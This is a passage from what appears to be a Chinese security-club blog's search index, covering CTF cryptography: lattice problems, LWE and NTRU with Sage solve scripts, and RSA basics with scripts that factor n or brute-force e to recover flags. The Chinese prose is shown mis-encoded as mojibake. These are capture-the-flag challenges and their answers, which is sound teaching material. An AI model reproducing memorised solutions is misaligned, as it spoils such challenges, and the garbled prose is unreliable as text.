class="number">3</span>])</span><br></pre></td></tr></table></figure>
<h2 id="import">4.import</h2>
<p>pythoné‡Œé¢æœ€é‡è¦çš„å°±æ˜¯å„ç§å„æ ·çš„åŒ…ï¼Œå­¦ä¼šå¯¼åŒ…pythonå°±ä¼šäº†ä¸€åŠ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>åŒç›®å½•import</p>
]]></content>
      <categories>
        <category>ä¾‹ä¼š</category>
      </categories>
  </entry>
  <entry>
    <title>æ ¼å¯†ç </title>
    <url>/2022/06/20/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="æ ¼å¯†ç ">æ ¼å¯†ç </h1>
<p>ä¸€ç›´æƒ³åšä¸€ä¸ªæ•´ç†ï¼Œé¸½äº†ä¸¤ä¸ªå¤šæœˆï¼Œè€ƒå®Œè¯•æŠŠä¹‹å‰é¸½çš„è¡¥ä¸€ä¸‹</p>
<span id="more"></span>
<h2 id="æ ¼ä¸­çš„å›°éš¾é—®é¢˜">æ ¼ä¸­çš„å›°éš¾é—®é¢˜</h2>
<h3 id="svpæœ€çŸ­å‘é‡é—®é¢˜">SVPï¼šæœ€çŸ­å‘é‡é—®é¢˜</h3>
<p>ç»™å®šä¸€ä¸ªåŸºä¸ºBçš„Lattice L(B)ï¼Œæ‰¾åˆ°ä¸€ä¸ªè¿™ä¸ªåŸºæ„æˆçš„æ ¼ç‚¹Bx:xï¼Œä½¿å¾—è¿™ä¸ªç‚¹è·ç¦»0åæ ‡ç‚¹çš„è·ç¦»æœ€è¿‘ã€‚</p>
<p>SVPçš„å®½æ¾ç‰ˆæœ¬ï¼š<img src="https://www.zhihu.com/equation?tex=SVP_%5Cgamma" alt="[å…¬å¼]">ï¼Œå³æ‰¾åˆ°ä¸€ä¸ªåŸºæ„æˆçš„æ ¼ç‚¹Bx:xï¼Œä½¿å¾—è¿™ä¸ªåº—è·ç¦»åŸç‚¹çš„è·ç¦»å°äºæœ€çŸ­è·ç¦»çš„<img src="https://www.zhihu.com/equation?tex=%5Cgamma" alt="[å…¬å¼]">å€å³å¯ã€‚</p>
<h3 id="cvpæœ€è¿‘å‘é‡é—®é¢˜">CVPï¼šæœ€è¿‘å‘é‡é—®é¢˜</h3>
<p>ç»™å®šè¿ç»­ç©ºé—´ä¸­ä»»æ„çš„ä¸€ä¸ªç‚¹tï¼Œæ‰¾åˆ°è·ç¦»è¿™ä¸ªç‚¹æœ€è¿‘çš„æ ¼ç‚¹Bxã€‚</p>
<p>åŒç†å¯å¾—ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾—åˆ°CVPçš„å®½æ¾ç‰ˆï¼Œå³<img src="https://www.zhihu.com/equation?tex=CVP_%5Cgamma" alt="[å…¬å¼]">ã€‚</p>
<h3 id="sivpæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜">SIVPï¼šæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜</h3>
<p>ç»™å®šä¸€ä¸ªLattice <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28%5Cmathbf%7BB%7D%29" alt="[å…¬å¼]">ï¼Œæ‰¾åˆ°<img src="https://www.zhihu.com/equation?tex=n" alt="[å…¬å¼]">ä¸ªçº¿æ€§ç‹¬ç«‹çš„å‘é‡<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BBx_1%2C+%5Cdots%2C+Bx_n%7D" alt="[å…¬å¼]">å¹¶ä¸”è¿™äº›å‘é‡çš„é•¿åº¦éƒ½è¦å°äºç­‰äºæœ€é•¿çš„æœ€çŸ­å‘é‡<img src="https://www.zhihu.com/equation?tex=%5Clambda_n" alt="[å…¬å¼]">ã€‚</p>
<p>å’ŒSVPä¸CVPé—®é¢˜ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™å‡ºSIVPé—®é¢˜çš„å®½æ¾ç‰ˆå®šä¹‰ï¼Œå³<img src="https://www.zhihu.com/equation?tex=SIVP_%5Cgamma" alt="[å…¬å¼]">ã€‚</p>
<h2 id="åŸºäºlatticeçš„ä¿¡æ¯ä¼ è¾“">åŸºäºlatticeçš„ä¿¡æ¯ä¼ è¾“</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æŠŠéœ€è¦ä¼ è¾“çš„æ¶ˆæ¯æ˜ å°„åˆ°Latticeä¸­çš„ä¸€ä¸ªç‚¹ä¸Šï¼Œå³Bxï¼Œç„¶åæŠŠLå’ŒBxå‘é€å‡ºå»ã€‚å› ä¸ºå™ªéŸ³ï¼ŒBxä¼šåœ¨Lä¸Šäº§ç”Ÿåç§»ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦æ±‚è§£SVPé—®é¢˜ï¼Œå¯»æ‰¾åˆ°Lä¸Šçš„æœ€çŸ­å‘é‡ï¼Œå¹¶è®©å…¶ä¸å™ªéŸ³ç›¸æ¯”è¾ƒï¼Œè§‚å¯Ÿèƒ½å¦æ¢å¤å‡ºæ˜æ–‡ã€‚ç„¶åè‹¥æƒ³æ¢å¤å‡ºæ˜æ–‡ï¼Œéœ€è¦è§£å†³CVPé—®é¢˜ï¼Œæ‰¾åˆ°è¢«å™ªå£°å½±å“çš„å¯†æ–‡çš„æœ€è¿‘æ ¼ç‚¹ï¼Œä¸€èˆ¬æ¥è¯´å°±æ˜¯æ˜ å°„åˆ°æ ¼ä¸Šçš„æ˜æ–‡ã€‚</p>
<h2 id="lllç®—æ³•">LLLç®—æ³•</h2>
<p>æ–½å¯†ç‰¹æ­£äº¤åŒ–å¯ä»¥è®©ä¸€ç»„ååŸºå˜æˆä¸€ç»„å‚ç›´çš„å¥½åŸºï¼Œè€ŒLLLç®—æ³•å¯ä»¥æ‰¾åˆ°åœ¨æ­£äº¤åŒ–çš„åŸºç¡€ä¸Šæœ€çŸ­æˆ–è€…è¿‘ä¼¼æœ€çŸ­çš„æ­£äº¤åŸºã€‚</p>
<h2 id="lweé—®é¢˜é”™è¯¯å­¦ä¹ ">LWEé—®é¢˜ï¼šé”™è¯¯å­¦ä¹ </h2>
<p>å…ˆæ”¾ä¸€é“é¢˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(flag)</span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>, flag)</span><br><span class="line">flag1 = flag[:<span class="number">21</span>]</span><br><span class="line">flag2 = flag[<span class="number">21</span>:]</span><br><span class="line">row = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    <span class="keyword">return</span> [(x + y) % prime <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(msg1, msg2)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> msg1:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg2):</span><br><span class="line">            s += (x * y) % prime</span><br><span class="line">            s %= prime</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">leng</span>):</span><br><span class="line">    l = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">            l[x].append(random.randint(<span class="number">0</span>, <span class="number">511</span>))</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = genkey(<span class="built_in">len</span>(flag1))</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"></span><br><span class="line">cipher1 = multi(key, flag1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher1</span><br><span class="line"></span><br><span class="line">cipher2 = multi(key, flag2)</span><br><span class="line"></span><br><span class="line">noise = [random.randint(<span class="number">0</span>, <span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="built_in">print</span> add(noise, cipher2)</span><br></pre></td></tr></table></figure>
<p>flagçš„å‰åŠéƒ¨åˆ†ä¸ºæ™®é€šçš„çŸ©é˜µç›¸ä¹˜ï¼ŒååŠéƒ¨åˆ†åœ¨çŸ©é˜µç›¸ä¹˜çš„åŸºç¡€ä¸ŠåŠ å…¥äº†å™ªéŸ³ã€‚</p>
<p>é¦–å…ˆå¦‚æœå™ªéŸ³æ˜¯0çš„è¯ï¼Œç›¸ä¹˜å‡ºçš„ç»“æœå°±æ˜¯Lä¸Šçš„ä¸€ä¸ªæ ¼ç‚¹ã€‚ç°åœ¨åŠ å…¥äº†å™ªéŸ³ï¼Œæˆ‘ä»¬å¾—åˆ°çš„å°±æ˜¯æŸä¸ªæ ¼ç‚¹é™„è¿‘çš„å‘é‡ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦æ±‚è§£CVPé—®é¢˜å³å¯æ±‚è§£LWEé—®é¢˜ã€‚åŒæ—¶ï¼ŒCVPé—®é¢˜å¯ä»¥è¢«è§„çº¦åˆ°SIVPé—®é¢˜ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´LWEé—®é¢˜çš„å›°éš¾åº¦æ˜¯åŸºäºæœ€åæƒ…å†µçš„SIVPå›°éš¾åº¦çš„ã€‚</p>
<p>ç»™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sageè„šæœ¬ LWE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">key = </span><br><span class="line">p=<span class="number">2141</span></span><br><span class="line">b=</span><br><span class="line">A=Matrix(Zmod(p),key)</span><br><span class="line"><span class="built_in">print</span>(A.solve_right(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">21</span></span><br><span class="line">q = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line">A_values = </span><br><span class="line"></span><br><span class="line">b_values = </span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(res))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br></pre></td></tr></table></figure>
<h2 id="ntruåŠ å¯†">NTRUåŠ å¯†</h2>
<p>NTRUçš„æœ¬è´¨å°±æ˜¯SVPé—®é¢˜ã€‚å®é™…ä¸Šï¼ŒLLLç®—æ³•åŠå…¶å˜ç§ç®—æ³•æ˜¯ç›®å‰å·²çŸ¥åœ¨è¾ƒä½ç»´åº¦çš„latticeä¸­æ±‚è§£SVPçš„æœ€å¥½çš„ç®—æ³•ï¼Œä½†æ˜¯åœ¨è¾ƒé«˜ç»´åº¦ä¸­å°±æ¯”è¾ƒä¹åŠ›ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">1888131080991802984469142252767428996708357845414525789382920257253450734136628648374571804259719424143388465346476293366644738737089607039465127514487405</span></span><br><span class="line">p = <span class="number">30611187447617951438057661643828594439836168499045103637492727875883545693704706710809270955729333435251594169116242188128775616562859932991842965711916421973513501170770682029019363173114263880664543027598219327851802812372758784840490412167556903172872555298867886904331797406762790534760341763270179874103596315439602969532398796744300268959212967152977297923303435136058320818336169166426865495487391347983169818270302355278949814298699167819318471127268309841253880404251042151162557234493453591687370817297674493012095163546638810088146738185919186385185115618449986759562697777952684453338987559120695742612663</span></span><br><span class="line">h = <span class="number">21312401103364823065661625965265254047976261102113426643161584691333735528853578330462720782012571325209425607725450902072660790420041271498835143983658324491397948972480792470439905794590608772344151134928174674417907495690758864900707486731428987072095395641677518641643685295486795802883828831926635233976602465690044844008674887604376578289424972631509896184649710918327894604786477135136421222185152303050748164371324119467682895596417745201794158939881061666663709040766320031697689020600295103351632352583239176099726804730980876514993290370570966082812844360442005544939574202193639394320702060361753336559136</span></span><br><span class="line">c = <span class="number">16940539604003327722979410435578617956215682038759397881493708848549559668095838737615772551889674113155566943460688615187510308352387746131182860772735244685105354949311113745596385193812888514879929848085807780411336350803009420541916609478955298130063431885517727744668841197297817243205861167004168641880226875601283896199831113765890902106375084917385016349416483298441391462272070565319424930392336694536562067484570233782710064495559877940944602837436374378241977922432719824129042239016560841938886647111460591440853620154778487323813228157104022518913321245126759601657046000849672318847957185592562785436558</span></span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, [[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="keyword">assert</span> m == d</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>åœ¨æ ¼åŸº[1,h]å’Œ[0,p]ä¸Šï¼Œ[f,g]æ˜¯å…¶ä¸­çš„æœ€çŸ­å‘é‡ã€‚é€šè¿‡LLLç®—æ³•æ±‚è§£å‡ºf,gåï¼Œé€šè¿‡ä¸€ç³»åˆ—è®¡ç®—å¯å¾—mã€‚</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>æ ¼</tag>
      </tags>
  </entry>
  <entry>
    <title>èºä¸ç½‘å®‰å·¥ä½œå®¤ç¬¬äºŒæ¬¡ä¾‹ä¼šï¼šRSA</title>
    <url>/2022/06/01/%E8%9E%BA%E4%B8%9D%E7%BD%91%E5%AE%89%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BE%8B%E4%BC%9A%EF%BC%9ARSA/</url>
    <content><![CDATA[<h1 id="rsaä»‹ç»">RSAä»‹ç»</h1>
<h2 id="æ•°å­¦åŸºç¡€">æ•°å­¦åŸºç¡€</h2>
<p>RSAç®—æ³•æ˜¯ç°ä»Šä½¿ç”¨æœ€å¹¿æ³›çš„å…¬é’¥å¯†ç ç®—æ³•ï¼Œä¹Ÿæ˜¯å·ç§°åœ°çƒä¸Šæœ€å®‰å…¨çš„åŠ å¯†ç®—æ³•ã€‚</p>
<h3 id="æ¨¡è¿ç®—ä¸åŒä½™å¼">æ¨¡è¿ç®—ä¸åŒä½™å¼</h3>
<p>ä¸¤ä¸ªæ•´æ•°aï¼Œbï¼Œè‹¥å®ƒä»¬é™¤ä»¥æ­£æ•´æ•°mæ‰€å¾—çš„ä½™æ•°ç›¸ç­‰ï¼Œåˆ™ç§°aï¼Œbå¯¹äºæ¨¡måŒä½™ï¼Œè®°ä½œ: a â‰¡ b mod mï¼›ä¾‹å¦‚ï¼š26 â‰¡ 14 mod 12ã€‚</p>
<span id="more"></span>
<h3 id="äº’è´¨å…³ç³»">äº’è´¨å…³ç³»</h3>
<p>å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°ï¼Œé™¤äº†1ä»¥å¤–ï¼Œæ²¡æœ‰å…¶ä»–å…¬å› å­ï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸¤ä¸ªæ•°æ˜¯äº’è´¨å…³ç³»ã€‚æ¯”å¦‚ï¼Œ15å’Œ32æ²¡æœ‰å…¬å› å­ï¼Œæ‰€ä»¥å®ƒä»¬æ˜¯äº’è´¨å…³ç³»ã€‚è¿™è¯´æ˜ï¼Œä¸æ˜¯è´¨æ•°ä¹Ÿå¯ä»¥æ„æˆäº’è´¨å…³ç³»ã€‚</p>
<h3 id="æ¬§æ‹‰å‡½æ•°">æ¬§æ‹‰å‡½æ•°</h3>
<p>Ï†(n)çš„å€¼è¡¨ç¤ºå°äºç­‰äºnçš„æ­£æ•´æ•°ä¹‹ä¸­ï¼Œæœ‰å¤šå°‘ä¸ªæ•°ä¸næ„æˆäº’è´¨å…³ç³»ã€‚</p>
<ol type="1">
<li>å¦‚æœn=1ï¼Œåˆ™ Ï†(1) = 1 ã€‚å› ä¸º1ä¸ä»»ä½•æ•°éƒ½æ„æˆäº’è´¨å…³ç³»ã€‚</li>
<li>å¦‚æœnæ˜¯è´¨æ•°ï¼Œåˆ™ Ï†(n)=n-1 ã€‚å› ä¸ºè´¨æ•°ä¸å°äºå®ƒçš„æ¯ä¸€ä¸ªæ•°ï¼Œéƒ½æ„æˆäº’è´¨å…³ç³»ã€‚æ¯”å¦‚5ä¸1ã€2ã€3ã€4éƒ½æ„æˆäº’è´¨å…³ç³»ã€‚</li>
<li>å¦‚æœnæ˜¯è´¨æ•°çš„æŸæ¬¡æ–¹ï¼Œå³ n = p^k (pä¸ºè´¨æ•°ï¼Œkä¸ºå¤§äºç­‰äº1çš„æ•´æ•°)ï¼Œåˆ™ <span class="math display">\[ Ï†(p^k) = p^k-p^{k-1}=p^k*(1-\frac{1}{p}) \]</span> å› ä¸ºåªæœ‰å½“ä¸€ä¸ªæ•°ä¸åŒ…å«è´¨æ•°pï¼Œæ‰å¯èƒ½ä¸näº’è´¨ã€‚è€ŒåŒ…å«è´¨æ•°pçš„æ•°ä¸€å…±æœ‰p^(k-1) ä¸ªï¼Œå³1Ã—pã€2Ã—pã€3Ã—pã€â€¦ã€<span class="math inline">\(p^{(k-1)}Ã—p\)</span>ï¼ŒæŠŠå®ƒä»¬å»é™¤ï¼Œå‰©ä¸‹çš„å°±æ˜¯ä¸näº’è´¨çš„æ•°ã€‚</li>
<li>å¦‚æœnå¯ä»¥åˆ†è§£æˆä¸¤ä¸ªäº’è´¨çš„æ•´æ•°ä¹‹ç§¯ï¼Œå³n = p1 Ã— p2ï¼Œåˆ™Ï†(n) = Ï†(p1p2) = Ï†(p1)Ï†(p2)ã€‚</li>
</ol>
<h3 id="æ¬§æ‹‰å®šç†">æ¬§æ‹‰å®šç†</h3>
<p>å¦‚æœä¸¤ä¸ªæ­£æ•´æ•°aå’Œnäº’è´¨ï¼Œåˆ™nçš„æ¬§æ‹‰å‡½æ•° Ï†(n) å¯ä»¥è®©ä¸‹é¢çš„ç­‰å¼æˆç«‹ï¼š <span class="math display">\[ a^{Ï†(n)}â‰¡1 mod n \]</span> å½“nä¸ºè´¨æ•°æ—¶ï¼Œæ¬§æ‹‰å®šç†å¯ä»¥åŒ–ä¸ºï¼š <span class="math display">\[ a^{n-1}â‰¡1 mod n \]</span> è¿™å°±æ˜¯è´¹é©¬å°å®šç†ï¼Œå®ƒæ˜¯æ¬§æ‹‰å®šç†çš„ç‰¹ä¾‹ã€‚</p>
<h3 id="æ¨¡åå…ƒç´ ">æ¨¡åå…ƒç´ </h3>
<p>å½“ab â‰¡ 1 mod næ—¶ï¼Œç§°bä¸ºaçš„æ¨¡åå…ƒç´ ï¼Œä¹Ÿç§°bä¸ºaåœ¨æ¨¡nåŸŸä¸‹çš„é€†ã€‚</p>
<h2 id="rsaå…¬ç§é’¥ç”Ÿæˆ">RSAå…¬ç§é’¥ç”Ÿæˆ</h2>
<ol type="1">
<li>åŠ å¯†è€…éšæœºé€‰æ‹©ä¸¤ä¸ªè¶³å¤Ÿå¤§çš„è´¨æ•°på’Œqï¼ˆå®é™…ä¸­é€šå¸¸é€‰æ‹©512ä½ï¼‰ã€‚</li>
<li>è®¡ç®—n = p*qã€‚</li>
<li>è®¡ç®—Ï†(n) = (p-1)*(q-1)ã€‚</li>
<li>éšæœºé€‰æ‹©ä¸€ä¸ªå°äºÏ†(n)ä¸”ä¸Ï†(n)äº’è´¨çš„eã€‚</li>
<li>è®¡ç®—eåœ¨æ¨¡nä¸‹çš„é€†dï¼Œå³e*d â‰¡ 1 mod Ï†(n)ã€‚</li>
<li>(n, e)å°è£…ä¸ºå…¬é’¥ï¼Œ(p, q, d)å°è£…ä¸ºç§é’¥ã€‚</li>
</ol>
<p>è‡³æ­¤æ‰€æœ‰æ•°æ®è®¡ç®—å®Œæˆã€‚</p>
<h2 id="åŠ å¯†ä¸è§£å¯†">åŠ å¯†ä¸è§£å¯†</h2>
<ol type="1">
<li>å°†å¯†æ–‡è½¬ç ä¸ºåå…­è¿›åˆ¶æ•°æ®mã€‚</li>
<li>c â‰¡ m^e mod nï¼Œc å³ä¸ºå¯†æ–‡ã€‚</li>
<li>m â‰¡ c^d mod nã€‚</li>
</ol>
<h2 id="è§£å¯†ç®—æ³•è¯æ˜">è§£å¯†ç®—æ³•è¯æ˜</h2>
<p><span class="math display">\[  m^{Ï†(n)}â‰¡1 modn\ m^{kÏ†(n)+1}â‰¡m modn\ m^{ed}â‰¡ c^dâ‰¡ m modn \]</span></p>
<h2 id="å„ç§é¢˜å‹ä»‹ç»">å„ç§é¢˜å‹ä»‹ç»</h2>
<h3 id="å·²çŸ¥necç›´æ¥åˆ†è§£">å·²çŸ¥n,e,cï¼ˆç›´æ¥åˆ†è§£ï¼‰</h3>
<blockquote>
<p>n = 5221752478228507746817749923851271656160818214576859501288944132584319293315684653488045907979899837193635911723726962945029941498626499202969421505409311</p>
</blockquote>
<blockquote>
<p>c = 3508639296102512450759730723246544089341766434632407076573093985251751867216058996957915991315405129764052410967805084651073059790045344575535583118277973</p>
</blockquote>
<blockquote>
<p>e = 65537</p>
</blockquote>
<p>åœ¨çº¿åˆ†è§£å¤§æ•´æ•°ï¼š<a href="https://security.feishu.cn/link/safety?target=http://www.factordb.com/&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">http://www.factordb.com/</a></p>
<p>æœ¬åœ°åˆ†è§£ï¼šyafu</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">5221752478228507746817749923851271656160818214576859501288944132584319293315684653488045907979899837193635911723726962945029941498626499202969421505409311</span></span><br><span class="line">p = <span class="number">72261694404632581565900073275105451175333931206466294424742649423557055375657</span></span><br><span class="line">q = <span class="number">72261694404632581565900073275105451175333931206466294424742649423557055375623</span></span><br><span class="line">c = <span class="number">3508639296102512450759730723246544089341766434632407076573093985251751867216058996957915991315405129764052410967805084651073059790045344575535583118277973</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> n == p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<h3 id="å·²çŸ¥ncpqçˆ†ç ´e">å·²çŸ¥n,c,p,q(çˆ†ç ´e)</h3>
<blockquote>
<p>n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127 c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128 p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c = <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line">p = <span class="number">139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183</span></span><br><span class="line">q = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(e):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = invert(e, phi)</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">            flag = <span class="built_in">str</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;CTF&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(e, <span class="string">&#x27;\n&#x27;</span>, flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
